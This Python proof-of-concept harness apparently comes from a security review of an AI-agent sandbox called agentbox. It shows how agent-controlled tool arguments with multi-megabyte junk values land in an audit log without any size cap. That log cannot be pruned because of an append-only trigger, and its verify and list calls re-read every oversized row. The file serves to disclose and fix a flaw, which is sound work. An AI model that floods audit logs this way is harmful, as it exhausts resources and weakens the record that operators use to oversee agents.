"""Bounded local harness: show agentbox audit log persists an uncapped,
agent-controlled tool-arg payload, that it cannot be deleted (append-only
trigger), and that verify() / list() re-load the whole row.

Imports only agentbox.audit (stdlib-only module: hashlib/json/re/sqlite3).
Reimplements service.AgentBox._logged_args INLINE (copied verbatim from
agentbox/service.py:131-137) so the harness needs no docker import.
"""
import sys, sqlite3, hashlib
sys.path.insert(0, "/target")
from agentbox.audit import AuditLog, AuditWriteError

# ---- copy of service.AgentBox._logged_args (service.py:131-137) ----
def logged_args(tool, args):
    if tool == "write_file" and "content" in args:
        data = str(args.get("content", "")).encode("utf-8")
        return {k: v for k, v in args.items() if k != "content"} | {
            "content_bytes": len(data), "content_sha256": hashlib.sha256(data).hexdigest()}
    return args

db = "/scratch/audit_test.db"
log = AuditLog(db)
# register a dummy human token so _mask runs its replace loop (realistic cost)
log.register_secret("hum_" + "x" * 30)

# agent-controlled args dict for a normal ALLOW tool (read_file). The agent
# adds one giant junk key. _logged_args passes NON-write_file args through
# unchanged, so the whole junk lands in the audit payload.
BIG = 3 * 1024 * 1024  # 3 MiB single value; far beyond any plausible audit row
args = {"path": "/workspace/x", "junk": "A" * BIG}
la = logged_args("read_file", args)
print("logged_args kept junk key unchanged:", "junk" in la, "len=", len(la["junk"]))

# This is exactly service._call_tool line 297-298: the FIRST thing done, before
# policy.decide, so even a would-be-denied call persists the row.
rid = log.append(actor="agent", event="tool_request", sandbox_id="sb_dummy",
                 tool="read_file", payload={"args": la})
print("appended row id:", rid)

# how big is the persisted row?
con = sqlite3.connect(db)
(payload_len,) = con.execute("SELECT length(payload) FROM audit WHERE id=?", (rid,)).fetchone()
print("persisted payload bytes:", payload_len)

# accumulation: 5 more rows from 5 more tool calls => linear unbounded growth
for _ in range(3):
    log.append(actor="agent", event="tool_request", sandbox_id="sb_dummy",
               tool="list_dir", payload={"args": {"path": "/workspace", "junk": "B" * BIG}})
(total,) = con.execute("SELECT SUM(length(payload)) FROM audit").fetchone()
(nrows,) = con.execute("SELECT COUNT(*) FROM audit").fetchone()
print("rows:", nrows, "total payload bytes:", total)

# recovery: operator CANNOT prune the oversized rows (append-only trigger)
try:
    con.execute("DELETE FROM audit WHERE id=?", (rid,))
    print("DELETE SUCCEEDED (unexpected)")
except sqlite3.Error as e:
    print("DELETE blocked by trigger:", type(e).__name__, "-", str(e))

# amplification: verify() loads ALL rows and recomputes hash over full payload
v = log.verify()
print("verify ok:", v.ok, "checked rows:", v.checked)
# list() (used by /ui/verify with limit=100000) returns full payloads
rows = log.list(limit=100000)
print("list returned rows:", len(rows), "first junk len:",
      len(rows[0]["payload"].get("args", {}).get("junk", "")))
print("RESULT: audit payload is uncapped, persistent, undeletable, fully re-read")
